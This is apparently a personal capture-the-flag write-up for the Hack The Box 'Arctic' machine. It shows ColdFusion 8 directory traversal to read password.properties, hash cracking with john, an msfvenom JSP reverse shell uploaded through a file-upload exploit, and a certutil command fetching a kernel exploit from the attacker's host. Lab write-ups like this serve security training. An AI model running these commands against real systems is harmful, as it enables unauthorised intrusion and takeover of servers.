# Box: Arctic
# Level: Easy
# OS: Windows
<hr>

Lets get started

# Recon

## Portscanning

command:```sudo nmap -A -T4 -v -p-  10.129.108.187```

```
Nmap scan report for 10.129.108.187
Host is up (0.19s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
|_http-title: Index of /
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.007 days (since Fri Sep 22 00:28:52 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   222.51 ms 10.10.14.1
2   222.63 ms 10.129.108.187

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 22 00:39:11 2023 -- 1 IP address (1 host up) scanned in 379.45 seconds
```
From our scan we have 3 open ports, we have a port 8500 that runs the http service. Our enumeration today will be focused on that port.



# Enumeration (Port 8500)

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/005c79fd-6322-4e10-b7f5-a42210cd5721)

Checking the directories, I found this login page

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c142b585-6539-46a6-a06d-4b0388083778)

From the above screenshot we can see that ```Adobe ColdFusion``` is being used on this webpage

Lets try using default passwords for the login page

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/336d2dab-2ba4-4afd-96ab-a08cd9404add)

oops, doesn't work🥲

Well, I found an exploit for this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dac6ffd1-8704-45a4-8091-9f766a84137a)

So, it is vulnerabale to ```CVE-2010-2861```. You can get it [here](https://www.exploit-db.com/exploits/14641) 

Reading the exploit, I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7f0ea944-f3f0-4d95-90d6-999e9bd2b7b8)

This means we can exploit this webpage using directory transversal. Well, this is not a Linux box, I would have said we should try reading the ```/etc/passwd``` file😂. 

After a little research, I found out that ColdFusion 8 passwords are typically stored in an encrypted format in a configuration file called ```password.properties```. This file is used to store various ColdFusion passwords, including the administrator password and datasources passwords. The full path is typically ```[ColdFusion Installation Directory]/lib/password.properties```.

So we'll try to read the ```password.properties``` by navigating to the url ```?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b1a62ce8-2ebf-4770-99d3-9f40b7a9cd26)

We found an encrypted password hehe. Lets try to identify the hash using the ```hash-identifier``` command

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]                                                                                                                                              
└─$ hash-identifier                                                                                                                                                                             
   #########################################################################                                                                                                                    
   #     __  __                     __           ______    _____           #                                                                                                                    
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #                                                                                                                    
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #                                                                                                                    
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #                                                                                                                    
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #                                                                                                                    
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #                                                                                                                    
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

Least Possible Hashs:
[+] Tiger-160
[+] Haval-160
[+] RipeMD-160
[+] SHA-1(HMAC)
[+] Tiger-160(HMAC)
[+] RipeMD-160(HMAC)
[+] Haval-160(HMAC)
[+] SHA-1(MaNGOS)
[+] SHA-1(MaNGOS2)
[+] sha1($pass.$salt)
[+] sha1($salt.$pass)
[+] sha1($salt.md5($pass))
[+] sha1($salt.md5($pass).$salt)
[+] sha1($salt.sha1($pass))
[+] sha1($salt.sha1($salt.sha1($pass)))
[+] sha1($username.$pass)
[+] sha1($username.$pass.$salt)
[+] sha1(md5($pass))
[+] sha1(md5($pass).$salt)
```
It's ```sha1``` cool. We can use john to crack this

command:```john hash.txt  --wordlist=/home/bl4ck4non/Documents/rockyou.txt  --format=RAW-sha1```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]
└─$ cat hash.txt
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]
└─$ john hash.txt  --wordlist=/home/bl4ck4non/Documents/rockyou.txt  --format=RAW-sha1
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
happyday         (?)     
1g 0:00:00:00 DONE (2023-09-24 11:35) 1.428g/s 7314p/s 7314c/s 7314C/s jodie..babygrl
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```
We got the password to be ```happyday```. This means now we'll be able to login to the webpage.

Well lets do that

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ff266854-2e70-4a45-8329-5261fc677dd3)

We are logged in hehe

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b68ef508-0b5a-481f-80e6-f1ffdaa296c6)

Now that we are logged in we can go ahead to upload a ```.jsp``` shell.



# Exploitation

Well, I found a script that'll help with the uploading, you can download it [here](https://github.com/nipunsomani/Adobe-ColdFusion-8-File-Upload-Exploit)

Before running  the script, lets generate our jsp payload using msfvenom

command:```msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.142 LPORT=1234 -f raw > abeg.jsp```

Ensure you set the LHOST and LPORT to the appropriate values

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.142 LPORT=1234 -f raw > abeg.jsp
Payload size: 1498 bytes
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]
└─$ ls -la abeg.jsp 
-rw-r--r-- 1 bl4ck4non bl4ck4non 1498 Sep 24 12:19 abeg.jsp
```
Now, lets use our exploit to upload this payload

command:```python2 exploit.py 10.129.110.118 8500 abeg.jsp```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]
└─$ python2 exploit.py 10.129.110.118 8500 abeg.jsp
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Sending payload...
Successfully uploaded payload!
Find it at http://10.129.110.118:8500/userfiles/file/exploit.jsp
```
Our payload has been uploaded successfully

Navigating to the path were it was uploaded to

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/038eb12e-8dab-4367-8073-ff3bef7b634a)

cool, now lets set up our netcat listener before clicking on the payload

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0e1c80f7-c574-4a65-8451-ed719f889c2a)

Clicking on the payload and checking our netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f56127ad-64a0-4c6a-83ce-d535bd35ce92)

We have gotten a user shell😎, lets go ahead and escalate our privileges





# Privilege Escalation

Running the ```systeminfo``` command, I found an outdated kernel

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3ed77c3b-ca58-4b4d-be36-5408bb903429)

There's an exploit for this kernel.

After doing some research I found this [exploit](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe). Download it to your machine, so the next thing we'll do is to send the exploit to the target's machine

Ensure you create a ```Temp``` directory before sending the exploit over

command:```mkdir Temp```

Then ```cd Temp```

Sending the file over to the target

command:```certutil -urlcache -f http://10.10.14.142/Chimichurri.exe c.exe```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/15d935c2-bcaf-43a3-bae3-d866f8b590d4)















